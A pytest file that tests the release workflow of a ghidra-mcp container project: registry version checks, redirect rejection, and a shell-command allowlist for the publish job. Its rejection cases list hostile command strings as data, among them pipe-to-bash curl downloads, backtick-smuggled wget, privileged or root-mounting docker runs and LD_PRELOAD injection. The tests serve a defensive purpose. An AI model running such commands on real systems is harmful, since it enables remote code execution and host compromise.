"""Behavior tests for the release workflow scripts.

The workflow is parsed with PyYAML and its scripts are executed locally: the version
check runs against a fake OCI registry, the re-read step runs with bash the way
GitHub Actions does, and every publish-job shell command is checked against an
allowlist.
"""

import ast
import json
import os
import re
import shlex
import subprocess
import sys
import threading
from collections.abc import Iterator
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest
import yaml


ROOT = Path(__file__).parents[1]
WORKFLOW = ROOT / ".github/workflows/publish-container.yml"
REPOSITORY = "xjoker/ghidra-mcp"
TAGS_PATH = f"/v2/{REPOSITORY}/tags/list"
FIRST_PAGE = f"{TAGS_PATH}?n=1000"
VERSION_CHECK = "Require a version newer than every published version"
ALLOWED_PUBLISH_ACTIONS = {
    "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
    "docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f",
    "docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9",
    "docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8",
}
CANDIDATE_IMAGE = '"${IMAGE_NAME}@${{ steps.image.outputs.digest }}"'
# The candidate image as one shell word, after shlex has removed the quotes.
CANDIDATE_WORD = "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"


@dataclass
class Step:
    name: str
    raw: dict[str, Any]

    @property
    def run(self) -> str | None:
        value = self.raw.get("run")
        assert value is None or isinstance(value, str), self.name
        return value

    @property
    def uses(self) -> str | None:
        return self.raw.get("uses")

    @property
    def shell(self) -> str | None:
        return self.raw.get("shell")


def _workflow() -> dict[str, Any]:
    data = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    assert isinstance(data, dict)
    return data


def _jobs() -> dict[str, list[Step]]:
    return {
        name: [Step(step["name"], step) for step in job["steps"]]
        for name, job in _workflow()["jobs"].items()
    }


def _step(job: str, name: str) -> Step:
    matches = [step for step in _jobs()[job] if step.name == name]
    assert len(matches) == 1, name
    return matches[0]


def _commands(script: str) -> list[str]:
    return [
        line.strip()
        for line in script.splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]


@dataclass
class Registry:
    pages: dict[str, tuple[int, object, str | None]] = field(default_factory=dict)
    token_status: int = 200
    token_body: object = field(default_factory=lambda: {"token": "fake-token"})
    requests: list[str] = field(default_factory=list)
    scripted: dict[str, list[tuple[int, object, dict[str, str]]]] = field(default_factory=dict)
    url: str = ""

    def page(
        self, path: str, tags: object, next_link: str | None = None, status: int = 200
    ) -> None:
        body = (
            tags if isinstance(tags, dict) or status != 200 else {"name": REPOSITORY, "tags": tags}
        )
        self.pages[path] = (status, body, next_link)


@pytest.fixture
def registry() -> Iterator[Registry]:
    state = Registry()

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args: object) -> None:
            pass

        def _send(
            self,
            status: int,
            body: object,
            link: str | None = None,
            headers: dict[str, str] | None = None,
        ) -> None:
            data = body if isinstance(body, bytes) else json.dumps(body).encode()
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            if link is not None:
                self.send_header("Link", f'<{link}>; rel="next"')
            for name, value in (headers or {}).items():
                self.send_header(name, value)
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self) -> None:
            state.requests.append(self.path)
            if state.scripted.get(self.path):
                status, body, headers = state.scripted[self.path].pop(0)
                self._send(status, body, headers=headers)
                return
            if self.path.startswith("/token?"):
                assert self.path == f"/token?service=ghcr.io&scope=repository:{REPOSITORY}:pull"
                self._send(state.token_status, state.token_body)
                return
            assert self.headers["Authorization"] == "Bearer fake-token"
            if self.path not in state.pages:
                self._send(404, {"errors": [{"code": "NAME_UNKNOWN"}]})
                return
            self._send(*state.pages[self.path])

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    state.url = f"http://127.0.0.1:{server.server_port}"
    thread = threading.Thread(target=server.serve_forever, args=(0.05,), daemon=True)
    thread.start()
    try:
        yield state
    finally:
        server.shutdown()
        server.server_close()


SLEEP_SHIM = """
import os
import time


def _record_sleep(seconds):
    with open(os.environ["SLEEP_LOG"], "a", encoding="utf-8") as log:
        log.write(f"{seconds}\\n")


time.sleep = _record_sleep
"""


def _version_check(
    registry: Registry, version: str, tmp_path: Path, image: str = f"ghcr.io/{REPOSITORY}"
) -> subprocess.CompletedProcess[str]:
    step = _step("publish", VERSION_CHECK)
    assert step.shell == "python3 {0}" and step.run is not None
    script = tmp_path / "version_check.py"
    script.write_text(step.run, encoding="utf-8")
    # time.sleep is replaced through sitecustomize so retry back-off is recorded
    # (in sleeps.log) instead of slowing the tests down.
    shim = tmp_path / "shim"
    shim.mkdir(exist_ok=True)
    (shim / "sitecustomize.py").write_text(SLEEP_SHIM, encoding="utf-8")
    env = {
        "PATH": os.environ.get("PATH", ""),
        "PYTHONPATH": str(shim),
        "SLEEP_LOG": str(tmp_path / "sleeps.log"),
        "VERSION": version,
        "REGISTRY_URL": registry.url,
        "IMAGE_NAME": image,
    }
    return subprocess.run(
        [sys.executable, str(script)], env=env, capture_output=True, text=True, timeout=60
    )


def _passes(result: subprocess.CompletedProcess[str]) -> bool:
    if result.returncode == 0:
        assert "is newer than published version" in result.stdout
        return True
    assert "Version check failed:" in result.stderr, result.stderr
    return False


@pytest.mark.parametrize(
    ("published", "candidate", "accepted"),
    [
        (["20261019.1", "latest", "sha-abc"], "20261019.2", True),
        (["20261019.1"], "20261020.1", True),
        (["20261019.1"], "20261019.1", False),
        (["20261019.1"], "20260722.7", False),
        (["20261019.1"], "20261018.9", False),
        (["20261019.9"], "20261019.10", True),
        (["20261019.9", "20261019.10"], "20261019.10", False),
        (["20261019.10"], "20261019.9", False),
        (["20251231.99", "20261019.1"], "20260101.1", False),
        (["20261019.1", "v20271231.1", "20271231.01", "20271231.0"], "20261019.2", True),
    ],
)
def test_version_check_compares_numerically(
    registry: Registry, tmp_path: Path, published: list[str], candidate: str, accepted: bool
) -> None:
    registry.page(FIRST_PAGE, published)

    assert _passes(_version_check(registry, candidate, tmp_path)) is accepted


def test_version_check_follows_every_page(registry: Registry, tmp_path: Path) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"], f"{TAGS_PATH}?last=a&n=1000")
    registry.page(f"{TAGS_PATH}?last=a&n=1000", ["latest"], f"{TAGS_PATH}?last=b&n=1000")
    registry.page(f"{TAGS_PATH}?last=b&n=1000", ["20261019.9"])

    assert not _passes(_version_check(registry, "20261019.5", tmp_path))
    result = _version_check(registry, "20261019.10", tmp_path)
    assert _passes(result)
    assert "3 pages" in result.stdout


@pytest.mark.parametrize(
    ("pages", "message"),
    [
        ({FIRST_PAGE: ([], None)}, "no published version tags"),
        ({FIRST_PAGE: (["latest", "sha-abc"], None)}, "no published version tags"),
        ({FIRST_PAGE: ({"errors": [{"code": "DENIED"}]}, None)}, "has no list of tags"),
        ({FIRST_PAGE: ({"name": REPOSITORY, "tags": None}, None)}, "has no list of tags"),
        ({FIRST_PAGE: ({"name": REPOSITORY, "tags": "20261019.1"}, None)}, "has no list of tags"),
        ({FIRST_PAGE: ({"name": REPOSITORY, "tags": [20261019]}, None)}, "has no list of tags"),
        (
            {
                FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}?last=a&n=1000"),
                f"{TAGS_PATH}?last=a&n=1000": ({"errors": [{"code": "UNKNOWN"}]}, None),
            },
            "has no list of tags",
        ),
        ({FIRST_PAGE: (["20261019.1"], FIRST_PAGE)}, "pagination loops back"),
        (
            {
                FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}?last=a&n=1000"),
                f"{TAGS_PATH}?last=a&n=1000": (["latest"], FIRST_PAGE),
            },
            "pagination loops back",
        ),
        (
            {FIRST_PAGE: (["20261019.1"], "https://evil.example/v2/x/tags/list?n=1")},
            "unexpected pagination link",
        ),
        (
            {
                FIRST_PAGE: (["20261019.1"], "/v2/other/repo/tags/list?n=1000"),
                "/v2/other/repo/tags/list?n=1000": (["20991231.9"], None),
            },
            "unexpected pagination link",
        ),
        (
            {FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}/../../other/tags/list?n=1000")},
            "unexpected pagination link",
        ),
        ({FIRST_PAGE: (["20261019.1"], f"{TAGS_PATH}?last=missing&n=1000")}, "returned HTTP 404"),
    ],
)
def test_version_check_fails_closed(
    registry: Registry, tmp_path: Path, pages: dict[str, tuple[object, str | None]], message: str
) -> None:
    for path, (tags, link) in pages.items():
        registry.page(path, tags, link)

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert message in result.stderr, result.stderr


def test_version_check_does_not_retry_client_errors(registry: Registry, tmp_path: Path) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"], f"{TAGS_PATH}?last=missing&n=1000")

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert registry.requests.count(f"{TAGS_PATH}?last=missing&n=1000") == 1


def test_version_check_caps_the_number_of_pages(registry: Registry, tmp_path: Path) -> None:
    for page in range(60):
        path = FIRST_PAGE if page == 0 else f"{TAGS_PATH}?last={page}&n=1000"
        registry.page(path, ["20261019.1"], f"{TAGS_PATH}?last={page + 1}&n=1000")

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert "more than 50 tag pages" in result.stderr
    assert len([path for path in registry.requests if path.startswith(TAGS_PATH)]) == 50


@pytest.mark.parametrize(
    ("status", "body", "message"),
    [
        (401, {"errors": []}, "returned HTTP 401"),
        (200, {"access_token": "x"}, "has no token"),
        (200, {"token": ""}, "token is empty"),
    ],
)
def test_version_check_fails_without_a_registry_token(
    registry: Registry, tmp_path: Path, status: int, body: object, message: str
) -> None:
    registry.token_status = status
    registry.token_body = body
    registry.page(FIRST_PAGE, ["20261019.1"])

    result = _version_check(registry, "20991231.1", tmp_path)

    assert result.returncode != 0
    assert message in result.stderr


@pytest.mark.parametrize(
    "image", ["docker.io/7678837-glitch/ghidra-mcp", "ghcr.io.evil.example/x", "", "ghcr.io"]
)
def test_version_check_rejects_an_image_outside_ghcr(
    registry: Registry, tmp_path: Path, image: str
) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])

    result = _version_check(registry, "20991231.1", tmp_path, image=image)

    assert result.returncode != 0
    assert "unexpected image name" in result.stderr
    assert registry.requests == []


def test_version_check_reads_inputs_only_from_the_environment() -> None:
    # Expressions interpolated into the script body would be code injection;
    # every input must arrive through env.
    step = _step("publish", VERSION_CHECK)
    assert step.run is not None and "${{" not in step.run
    assert set(step.raw["env"]) == {"VERSION", "REGISTRY_URL"}


def test_version_check_rejects_a_malformed_candidate(registry: Registry, tmp_path: Path) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])

    result = _version_check(registry, "20991231.01", tmp_path)

    assert result.returncode != 0
    assert "is not a YYYYMMDD.N version" in result.stderr


def test_version_check_uses_only_the_standard_library() -> None:
    script = _step("publish", VERSION_CHECK).run
    assert script is not None
    imported = set()
    for node in ast.walk(ast.parse(script)):
        if isinstance(node, ast.Import):
            imported.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            assert node.module is not None
            imported.add(node.module)
    assert imported == {
        "http.client",
        "json",
        "os",
        "re",
        "sys",
        "time",
        "typing",
        "urllib.error",
        "urllib.parse",
        "urllib.request",
    }


@dataclass
class Foreign:
    url: str = ""
    seen: list[tuple[str, str | None]] = field(default_factory=list)


@pytest.fixture
def foreign() -> Iterator[Foreign]:
    state = Foreign()

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args: object) -> None:
            pass

        def do_GET(self) -> None:
            state.seen.append((self.path, self.headers.get("Authorization")))
            data = json.dumps({"name": REPOSITORY, "tags": ["20200101.1"]}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(data)

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    state.url = f"http://127.0.0.1:{server.server_port}"
    thread = threading.Thread(target=server.serve_forever, args=(0.05,), daemon=True)
    thread.start()
    try:
        yield state
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
@pytest.mark.parametrize("target", ["same-host", "foreign-host"])
@pytest.mark.parametrize("where", ["token", "tags"])
def test_version_check_rejects_every_redirect(
    registry: Registry, foreign: Foreign, tmp_path: Path, status: int, target: str, where: str
) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])
    registry.page(f"{TAGS_PATH}?n=1000&moved=1", ["20200101.1"])
    if target == "same-host":
        location = f"{registry.url}{TAGS_PATH}?n=1000&moved=1"
    else:
        location = f"{foreign.url}{TAGS_PATH}?n=1000"
    token_path = f"/token?service=ghcr.io&scope=repository:{REPOSITORY}:pull"
    path = token_path if where == "token" else FIRST_PAGE
    registry.scripted[path] = [(status, {}, {"Location": location})]

    result = _version_check(registry, "20261019.2", tmp_path)

    assert result.returncode != 0
    assert f"was redirected (HTTP {status})" in result.stderr, result.stderr
    assert foreign.seen == []
    assert f"{TAGS_PATH}?n=1000&moved=1" not in registry.requests


@pytest.mark.parametrize(
    ("failures", "accepted", "attempts"),
    [
        ([429, 429], True, 3),
        ([500, 502, 503, 504], True, 5),
        ([429] * 5, False, 5),
        ([503] * 5, False, 5),
        ([401], False, 1),
        ([403], False, 1),
        ([404], False, 1),
    ],
)
def test_version_check_retries_only_transient_errors(
    registry: Registry, tmp_path: Path, failures: list[int], accepted: bool, attempts: int
) -> None:
    registry.page(FIRST_PAGE, ["20261019.1"])
    registry.scripted[FIRST_PAGE] = [(code, {"errors": []}, {}) for code in failures]

    result = _version_check(registry, "20261019.2", tmp_path)

    assert (result.returncode == 0) is accepted, result.stderr
    assert registry.requests.count(FIRST_PAGE) == attempts
    log = tmp_path / "sleeps.log"
    sleeps = [float(value) for value in log.read_text().split()] if log.exists() else []
    assert len(sleeps) == attempts - 1
    assert sum(sleeps) <= 30


def test_version_check_bounds_every_request() -> None:
    script = _step("publish", VERSION_CHECK).run
    assert script is not None
    tree = ast.parse(script)
    calls = [node for node in ast.walk(tree) if isinstance(node, ast.Call)]
    opens = [
        call
        for call in calls
        if isinstance(call.func, ast.Attribute) and call.func.attr in {"open", "urlopen"}
    ]
    assert opens, "no HTTP call found"
    for call in opens:
        assert isinstance(call.func.value, ast.Name) and call.func.value.id == "OPENER"
        assert any(keyword.arg == "timeout" for keyword in call.keywords)
    assert "build_opener(RejectRedirects)" in script


def _reread(tmp_path: Path, version_file: str, ref: str, tested: str, schema: str) -> int:
    step = _step("publish", "Re-read version and test outputs")
    assert step.shell == "bash" and step.run is not None
    (tmp_path / "VERSION").write_text(version_file + "\n", encoding="utf-8")
    output = tmp_path / "github_output"
    output.write_text("", encoding="utf-8")
    env = {
        "PATH": os.environ.get("PATH", ""),
        "GITHUB_OUTPUT": str(output),
        "GITHUB_REF_NAME": ref,
        "TESTED_VERSION": tested,
        "TESTED_SCHEMA": schema,
    }
    result = subprocess.run(
        ["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", step.run],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        timeout=30,
    )
    if result.returncode == 0:
        assert output.read_text(encoding="utf-8") == f"value={tested}\nschema={schema}\n"
    return result.returncode


@pytest.mark.parametrize(
    ("version_file", "ref", "tested", "schema", "accepted"),
    [
        ("20261019.2", "v20261019.2", "20261019.2", "7f776a2cc7e60136", True),
        ("20261019.2", "v20261019.2", "20261019.1", "7f776a2cc7e60136", False),
        ("20261019.2", "v20261019.2", "", "7f776a2cc7e60136", False),
        ("20261019.2", "v20261019.3", "20261019.2", "7f776a2cc7e60136", False),
        ("20261019.02", "v20261019.02", "20261019.02", "7f776a2cc7e60136", False),
        ("20261019.2", "v20261019.2", "20261019.2", "", False),
        ("20261019.2", "v20261019.2", "20261019.2", "7f776a2cc7e6013G", False),
    ],
)
def test_publish_rereads_version_and_matches_test_job_outputs(
    tmp_path: Path, version_file: str, ref: str, tested: str, schema: str, accepted: bool
) -> None:
    assert (_reread(tmp_path, version_file, ref, tested, schema) == 0) is accepted


def test_publish_checks_version_before_login_and_build() -> None:
    names = [step.name for step in _jobs()["publish"]]

    assert names.index("Re-read version and test outputs") < names.index(VERSION_CHECK)
    assert names.index(VERSION_CHECK) < names.index("Log in to GHCR")
    assert names.index(VERSION_CHECK) < names.index("Build and publish commit candidate")
    assert names.index("Verify the candidate digest") < names.index("Promote verified digest")


ALLOWED_COMMANDS = {
    "docker",
    "curl",
    "python3",
    "openssl",
    "seq",
    "sleep",
    "echo",
    "printf",
    "grep",
    "tr",
    "test",
    "[",
    "[[",
    "exit",
    "break",
    "true",
}
SHELL_KEYWORDS = {"if", "then", "else", "elif", "do", "while", "until", "!", "{"}
SHELL_TERMINATORS = {"fi", "done", "}", "]]"}
DOCKER_SUBCOMMANDS = {"pull", "run", "logs", "manifest", "buildx", "rm"}
# Only the forms today's publish job needs. Anything else, such as
# `docker buildx build --push` or `docker manifest push`, is rejected.
DOCKER_NESTED_SUBCOMMANDS = {
    "buildx": {("imagetools", "create"), ("imagetools", "inspect")},
    "manifest": {("inspect",)},
}
# `docker run` may only start the candidate digest with exactly these options;
# --privileged, -v/--mount, --entrypoint, --device, --pid, ... are all rejected.
DOCKER_RUN_FLAGS = {"-d"}
DOCKER_RUN_OPTIONS = {
    "--name": re.compile(r"^ghidra-mcp-ci$"),
    "--network": re.compile(r"^host$"),
    "-e": re.compile(r"^GHIDRA_MCP_(PUBLIC_URL|AUTH_TOKEN)="),
}
# Plain fetches only: no -L/--location, -o/-O, -H, -x, --resolve, --unix-socket.
CURL_OPTIONS = {"-f", "-s", "-S", "-fsS", "--fail", "--silent", "--show-error"}
LOCAL_URL = re.compile(r"^http://127\.0\.0\.1:[0-9]+(/[A-Za-z0-9._~/-]*)?$")
SEPARATORS = {";", "&&", "||", "|", "|&", "&", "(", ")"}
REDIRECTIONS = {">", ">>", "<", "<<", "<<<", ">&", "<&", "&>", ">|"}


def _logical_lines(script: str) -> list[str]:
    joined = re.sub(r"\\\n", " ", script)
    return [
        line.strip()
        for line in joined.splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]


def _split_substitutions(line: str) -> tuple[str, list[str]]:
    """Replace each $(...) with a placeholder and return the inner scripts."""
    inner: list[str] = []
    out = []
    index = 0
    while index < len(line):
        if line.startswith("$(", index) and not line.startswith("$((", index):
            depth, end = 1, index + 2
            while depth:
                assert end < len(line), f"unbalanced $( in {line!r}"
                depth += {"(": 1, ")": -1}.get(line[end], 0)
                end += 1
            inner.append(line[index + 2 : end - 1])
            out.append("SUBSTITUTION")
            index = end
        else:
            out.append(line[index])
            index += 1
    return "".join(out), inner


def _simple_commands(line: str) -> list[list[str]]:
    outer, inner = _split_substitutions(line)
    commands = [command for script in inner for command in _simple_commands(script)]
    lexer = shlex.shlex(outer, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    current: list[str] = []
    tokens = list(lexer)
    index = 0
    in_test = False
    while index < len(tokens):
        token = tokens[index]
        if token == "[[":
            in_test = True
        if in_test:
            # Inside [[ ... ]] operators such as || and < are test syntax.
            current.append(token)
            in_test = token != "]]"
        elif token in SEPARATORS:
            commands.append(current)
            current = []
        elif token in REDIRECTIONS:
            index += 1  # skip the redirection target
        else:
            current.append(token)
        index += 1
    commands.append(current)
    simple = []
    for words in commands:
        while words and (
            words[0] in SHELL_KEYWORDS or re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", words[0])
        ):
            words = words[1:]
        if not words or words[0] in SHELL_TERMINATORS or words[0] == "for":
            continue
        simple.append(words)
    return simple


def _docker_run_problems(args: list[str], line: str) -> list[str]:
    index = 0
    while index < len(args) and args[index].startswith("-"):
        option = args[index]
        if option in DOCKER_RUN_FLAGS:
            index += 1
        elif option in DOCKER_RUN_OPTIONS and index + 1 < len(args):
            if not DOCKER_RUN_OPTIONS[option].match(args[index + 1]):
                return [f"docker run {option} {args[index + 1]} is not allowed: {line}"]
            index += 2
        else:
            return [f"docker run option {option} is not allowed: {line}"]
    if args[index:] != [CANDIDATE_WORD]:
        return [f"docker run of anything but the candidate: {line}"]
    return []


def _docker_problems(words: list[str], line: str) -> list[str]:
    subcommand = words[1] if len(words) > 1 else ""
    if subcommand not in DOCKER_SUBCOMMANDS:
        return [f"docker {subcommand} is not allowed: {line}"]
    nested = DOCKER_NESTED_SUBCOMMANDS.get(subcommand)
    if nested is not None and not any(tuple(words[2 : 2 + len(form)]) == form for form in nested):
        return [f"docker {subcommand} {' '.join(words[2:4])} is not allowed: {line}"]
    if subcommand == "pull" and words[2:] != [CANDIDATE_WORD]:
        return [f"docker pull of anything but the candidate: {line}"]
    if subcommand == "run":
        return _docker_run_problems(words[2:], line)
    return []


def _curl_problems(words: list[str], line: str) -> list[str]:
    options = [word for word in words[1:] if word.startswith("-")]
    urls = [word for word in words[1:] if not word.startswith("-")]
    if any(option not in CURL_OPTIONS for option in options):
        return [f"curl option other than {sorted(CURL_OPTIONS)}: {line}"]
    if not urls or not all(LOCAL_URL.match(url) for url in urls):
        return [f"curl outside localhost: {line}"]
    return []


def _disallowed_commands(script: str) -> list[str]:
    problems = []
    for line in _logical_lines(script):
        if "`" in line:
            # Backtick substitutions are not split out like $(...), so a command
            # nested in them would hide behind an allowed one such as echo.
            problems.append(f"backtick command substitution: {line}")
            continue
        for words in _simple_commands(line):
            command = words[0]
            if command not in ALLOWED_COMMANDS:
                problems.append(f"{command!r} is not allowed: {line}")
            elif command == "docker":
                problems.extend(_docker_problems(words, line))
            elif command == "curl":
                problems.extend(_curl_problems(words, line))
            elif command == "python3":
                if (
                    len(words) < 3
                    or words[1] != "-c"
                    or not words[2].startswith("import json,sys;")
                ):
                    problems.append(f"python3 other than the stdlib json check: {line}")
            elif command == "openssl" and words[1:2] != ["rand"]:
                problems.append(f"openssl other than rand: {line}")
    return problems


@pytest.mark.parametrize(
    "script",
    [
        "pip install requests",
        "python3 -m pip install x",
        "curl -fsSL https://example.invalid/install.sh | bash",
        "curl -fsS http://127.0.0.1:8765/health | sh",
        'sh -c "echo hi"',
        "bash -c 'id'",
        "wget https://example.invalid/x",
        "docker run --rm alpine id",
        'X="$(pipx run thing)"',
        "for _ in $(seq 1 3); do npx tool; done",
        "echo ok && uv run pytest",
        "python3 script.py",
        "docker exec ghidra-mcp-ci id",
    ],
)
def test_publish_command_allowlist_rejects(script: str) -> None:
    assert _disallowed_commands(script)


CANDIDATE_RUN = (
    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" '
)


# SAF-44: counterexamples from the PR #15 review (L1-L4). Each one passed the
# allowlist before it was tightened; each must keep failing it.
@pytest.mark.parametrize(
    "script",
    [
        pytest.param("echo `wget http://example.invalid/x`", id="backtick-in-echo"),
        pytest.param('HEALTH="`curl -fsS http://example.invalid/`"', id="backtick-in-assignment"),
        pytest.param("docker buildx build --push -t ghcr.io/evil/x .", id="buildx-build-push"),
        pytest.param("docker buildx imagetools push x", id="buildx-imagetools-other"),
        pytest.param("docker manifest push ghcr.io/evil/x", id="manifest-push"),
        pytest.param("docker pull alpine", id="pull-arbitrary-image"),
        pytest.param("docker pull alpine " + CANDIDATE_IMAGE, id="pull-arbitrary-plus-candidate"),
        pytest.param(
            "docker pull --platform linux/arm64 " + CANDIDATE_IMAGE, id="pull-extra-option"
        ),
        pytest.param(CANDIDATE_RUN + "--privileged " + CANDIDATE_IMAGE, id="run-privileged"),
        pytest.param(CANDIDATE_RUN + "-v /:/host " + CANDIDATE_IMAGE, id="run-mount-root"),
        pytest.param(
            CANDIDATE_RUN + "--mount type=bind,src=/,dst=/host " + CANDIDATE_IMAGE,
            id="run-mount-option",
        ),
        pytest.param(
            CANDIDATE_RUN + "--entrypoint /bin/sh " + CANDIDATE_IMAGE, id="run-entrypoint"
        ),
        pytest.param("docker run -dv /:/host " + CANDIDATE_IMAGE, id="run-bundled-short-flags"),
        pytest.param(
            "docker run -d --network container:x " + CANDIDATE_IMAGE, id="run-other-network"
        ),
        pytest.param("docker run -d -e LD_PRELOAD=/x.so " + CANDIDATE_IMAGE, id="run-foreign-env"),
        pytest.param("docker run -d " + CANDIDATE_IMAGE + " id", id="run-trailing-argv"),
        pytest.param("curl -L http://127.0.0.1:8765/health", id="curl-L"),
        pytest.param("curl -fsSL http://127.0.0.1:8765/health", id="curl-fsSL"),
        pytest.param("curl --location http://127.0.0.1:8765/health", id="curl-location"),
        pytest.param("curl -fsS -o /tmp/x http://127.0.0.1:8765/health", id="curl-output-file"),
        pytest.param("curl -fsS http://127.0.0.1:8765@example.invalid/", id="curl-userinfo-host"),
    ],
)
def test_publish_command_allowlist_rejects_review_gaps(script: str) -> None:
    assert _disallowed_commands(script)


@pytest.mark.parametrize(
    "script",
    [
        "docker pull " + CANDIDATE_IMAGE,
        CANDIDATE_RUN + "-e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 " + CANDIDATE_IMAGE,
        "docker buildx imagetools create --tag x " + CANDIDATE_IMAGE,
        "docker buildx imagetools inspect x --format '{{json .Manifest.Digest}}'",
        'if X="$(docker manifest inspect "${IMAGE_NAME}:v" 2>&1)"; then exit 1; fi',
        'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
    ],
)
def test_publish_command_allowlist_accepts_the_forms_in_use(script: str) -> None:
    assert _disallowed_commands(script) == []


def test_publish_job_runs_only_allowlisted_commands() -> None:
    steps = _jobs()["publish"]

    assert steps[0].uses is not None and steps[0].uses.startswith("actions/checkout@")
    for step in steps:
        assert set(step.raw) <= {
            "name",
            "id",
            "uses",
            "with",
            "shell",
            "env",
            "run",
            "if",
            "timeout-minutes",
        }, step.name
        if step.uses is not None:
            assert step.uses in ALLOWED_PUBLISH_ACTIONS, step.uses
            assert step.run is None
            continue
        assert step.run is not None, step.name
        if step.name == VERSION_CHECK:
            assert step.shell == "python3 {0}"
            continue
        assert step.shell in (None, "bash"), step.name
        assert _disallowed_commands(step.run) == [], step.name
        for command in _commands(step.run):
            assert "|| true" not in command or command in {
                'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
                "docker rm -f ghidra-mcp-ci 2>/dev/null || true",
            }, (step.name, command)
    assert [step.name for step in steps if step.shell == "python3 {0}"] == [VERSION_CHECK]


def test_publish_steps_cannot_be_forced_past_a_failure() -> None:
    workflow = _workflow()
    for job_name, job in workflow["jobs"].items():
        assert "if" not in job, job_name
        assert "continue-on-error" not in job, job_name
    for step in _jobs()["publish"]:
        assert "continue-on-error" not in step.raw, step.name
        if step.name.startswith("Remove "):
            assert step.raw.get("if") == "always()", step.name
        else:
            assert "if" not in step.raw, (step.name, step.raw.get("if"))
    for step in _jobs()["test"]:
        assert "continue-on-error" not in step.raw, step.name
        assert "if" not in step.raw or (
            step.name.startswith("Remove ") and step.raw["if"] == "always()"
        ), step.name


def test_release_test_job_really_runs_the_container_e2e_test() -> None:
    step = _step("test", "Run container MCP end-to-end test")
    assert step.run is not None
    commands = _commands(step.run)

    pytest_line = commands.index(
        ".ci-venv/bin/uv run pytest tests/integration/test_container_mcp.py"
    )
    assert commands[pytest_line - 2].startswith(
        "GHIDRA_MCP_CONTAINER_URL=http://127.0.0.1:8765/mcp"
    )
    assert commands[pytest_line - 1].startswith('GHIDRA_MCP_CONTAINER_TOKEN="$TOKEN"')
    assert any(line.startswith("ghidra-mcp-release-test:local") for line in commands)


def test_release_jobs_have_timeouts() -> None:
    jobs = _workflow()["jobs"]

    assert set(jobs) == {"test", "publish"}
    assert all(10 <= job["timeout-minutes"] <= 60 for job in jobs.values())
    assert 1 <= _step("publish", VERSION_CHECK).raw["timeout-minutes"] <= 10
